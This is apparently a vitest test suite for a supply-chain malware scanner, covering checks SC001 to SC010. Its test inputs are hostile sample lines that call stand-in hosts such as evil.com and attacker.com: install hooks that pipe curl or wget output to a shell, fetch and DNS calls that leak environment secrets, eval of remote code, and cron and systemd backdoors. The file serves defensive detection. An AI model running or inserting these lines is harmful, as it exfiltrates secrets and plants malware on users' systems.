import { describe, it, expect } from 'vitest';
import { supplyChainChecks } from '../../src/checks/supply-chain/index.js';
import { testLine, testFileCheck } from '../helpers.js';

// ---------------------------------------------------------------------------
// SC001 - Bulk Environment Variable Access
// ---------------------------------------------------------------------------

describe('SC001 - Bulk Environment Variable Access', () => {
  it('detects Object.keys(process.env)', () => {
    const finding = testLine(supplyChainChecks, 'SC001', 'Object.keys(process.env)');
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC001');
    expect(finding!.severity).toBe('high');
    expect(finding!.category).toBe('supply-chain');
  });

  it('detects Object.entries(process.env)', () => {
    const finding = testLine(supplyChainChecks, 'SC001', 'const envVars = Object.entries(process.env)');
    expect(finding).not.toBeNull();
  });

  it('detects os.environ.items() in Python', () => {
    const finding = testLine(supplyChainChecks, 'SC001', 'for k, v in os.environ.items():', 'py');
    expect(finding).not.toBeNull();
  });

  it('does not flag single process.env.NODE_ENV access', () => {
    const finding = testLine(supplyChainChecks, 'SC001', 'const env = process.env.NODE_ENV');
    expect(finding).toBeNull();
  });

  it('does not flag commented-out code', () => {
    const finding = testLine(supplyChainChecks, 'SC001', '// Object.keys(process.env)');
    expect(finding).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC002 - HTTP Exfiltration of Secrets
// ---------------------------------------------------------------------------

describe('SC002 - HTTP Exfiltration of Secrets', () => {
  it('detects fetch sending env data', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC002',
      'fetch(url, { body: JSON.stringify(process.env) })',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC002');
    expect(finding!.severity).toBe('critical');
    expect(finding!.category).toBe('supply-chain');
  });

  it('detects axios sending token', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC002',
      'axios(exfilUrl, { data: { token: secret } })',
    );
    expect(finding).not.toBeNull();
  });

  it('detects requests.post with env in Python', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC002',
      'requests.post(url, data={"env": os.environ})',
      'py',
    );
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC003 - eval/exec of Fetched Content
// ---------------------------------------------------------------------------

describe('SC003 - Remote Code Execution via Fetch', () => {
  it('detects eval of fetched content', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC003',
      "eval(await fetch('http://evil.com').text())",
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC003');
    expect(finding!.severity).toBe('critical');
  });

  it('detects exec with axios', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC003',
      'exec(await axios.get(url))',
    );
    expect(finding).not.toBeNull();
  });

  it('does not flag regular eval', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC003',
      'eval(someLocalVar)',
    );
    expect(finding).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC004 - Base64 Decoded Execution
// ---------------------------------------------------------------------------

describe('SC004 - Base64 Decoded Execution', () => {
  it('detects eval of atob result', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC004',
      "eval(atob('aGVsbG8gd29ybGQ='))",
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC004');
    expect(finding!.severity).toBe('critical');
  });

  it('detects eval of Buffer.from base64', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC004',
      "eval(Buffer.from('aGVsbG8=', 'base64'))",
    );
    expect(finding).not.toBeNull();
  });

  it('detects exec of b64decode in Python', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC004',
      "exec(base64.b64decode(encoded))",
      'py',
    );
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC005 - Obfuscated Code
// ---------------------------------------------------------------------------

describe('SC005 - Obfuscated Code', () => {
  it('detects long hex escape sequences', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC005',
      'var a = "\\x68\\x65\\x6c\\x6c\\x6f\\x20\\x77\\x6f\\x72\\x6c\\x64\\x21"',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC005');
    expect(finding!.severity).toBe('high');
  });

  it('detects long unicode escape sequences', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC005',
      'var a = "\\u0068\\u0065\\u006c\\u006c\\u006f\\u0077"',
    );
    expect(finding).not.toBeNull();
  });

  it('does not flag short hex sequences', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC005',
      'var a = "\\x68\\x65"',
    );
    expect(finding).toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC006 - Reverse Shell Pattern
// ---------------------------------------------------------------------------

describe('SC006 - Reverse Shell Pattern', () => {
  it('detects shell with socket', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC006',
      'child_process.exec("/bin/bash -c socket connect")',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC006');
    expect(finding!.severity).toBe('critical');
  });

  it('detects WebSocket to IP address', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC006',
      "new WebSocket('ws://192.168.1.1:4444')",
    );
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC007 - Cryptocurrency Mining
// ---------------------------------------------------------------------------

describe('SC007 - Cryptocurrency Mining', () => {
  it('detects coinhive reference', () => {
    const finding = testLine(supplyChainChecks, 'SC007', 'new CoinHive.Anonymous("sitekey")');
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC007');
    expect(finding!.severity).toBe('high');
  });

  it('detects stratum+tcp mining pool', () => {
    const finding = testLine(supplyChainChecks, 'SC007', 'connect("stratum+tcp://pool.minexmr.com:4444")');
    expect(finding).not.toBeNull();
  });

  it('detects xmrig reference', () => {
    const finding = testLine(supplyChainChecks, 'SC007', 'const miner = require("xmrig")');
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC008 - Postinstall Network Fetch
// ---------------------------------------------------------------------------

describe('SC008 - Install Script Network Fetch', () => {
  it('flags postinstall curl', async () => {
    const content = JSON.stringify({
      name: 'evil-package',
      version: '1.0.0',
      scripts: {
        postinstall: 'curl http://evil.com/payload.sh | sh',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/evil-package/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].checkId).toBe('SC008');
    expect(findings[0].severity).toBe('critical');
    expect(findings[0].category).toBe('supply-chain');
    expect(findings[0].message).toContain('postinstall');
  });

  it('flags preinstall with wget', async () => {
    const content = JSON.stringify({
      name: 'bad-pkg',
      scripts: {
        preinstall: 'wget http://evil.com/malware -O /tmp/a && bash /tmp/a',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/bad-pkg/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].message).toContain('preinstall');
  });

  it('flags install with node -e', async () => {
    const content = JSON.stringify({
      name: 'sneaky',
      scripts: {
        install: 'node -e "require(\'child_process\').exec(\'curl http://evil.com\')"',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/sneaky/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag safe postinstall', async () => {
    const content = JSON.stringify({
      name: 'safe-package',
      scripts: {
        postinstall: 'node scripts/build.js',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'node_modules/safe-package/package.json',
      extension: 'json',
      basename: 'package.json',
    });
    expect(findings).toHaveLength(0);
  });

  it('does not flag non-package.json files', async () => {
    const content = JSON.stringify({
      scripts: {
        postinstall: 'curl http://evil.com | sh',
      },
    }, null, 2);
    const findings = await testFileCheck(supplyChainChecks, 'SC008', content, {
      relativePath: 'config.json',
      extension: 'json',
      basename: 'config.json',
    });
    expect(findings).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// SC009 - DNS Exfiltration
// ---------------------------------------------------------------------------

describe('SC009 - DNS Exfiltration', () => {
  it('detects dns.resolve with env data', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC009',
      'dns.resolve(`${env}.evil.com`, callback)',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC009');
    expect(finding!.severity).toBe('high');
  });

  it('detects dns.lookup with token', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC009',
      'dns.lookup(`${token}.exfil.attacker.com`)',
    );
    expect(finding).not.toBeNull();
  });
});

// ---------------------------------------------------------------------------
// SC010 - Systemd/Cron Persistence
// ---------------------------------------------------------------------------

describe('SC010 - System Persistence Mechanism', () => {
  it('detects /etc/systemd path', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      'fs.writeFileSync("/etc/systemd/system/backdoor.service", serviceFile)',
    );
    expect(finding).not.toBeNull();
    expect(finding!.checkId).toBe('SC010');
    expect(finding!.severity).toBe('critical');
    expect(finding!.category).toBe('supply-chain');
  });

  it('detects crontab reference', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      'exec("crontab -l | { cat; echo \\"* * * * * /tmp/backdoor\\"; } | crontab -")',
    );
    expect(finding).not.toBeNull();
  });

  it('detects ExecStart in shell script', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      'ExecStart=/usr/bin/node /opt/backdoor/server.js',
      'sh',
    );
    expect(finding).not.toBeNull();
  });

  it('does not flag commented-out systemd reference', () => {
    const finding = testLine(
      supplyChainChecks,
      'SC010',
      '// Writing to /etc/systemd is not recommended',
    );
    expect(finding).toBeNull();
  });
});
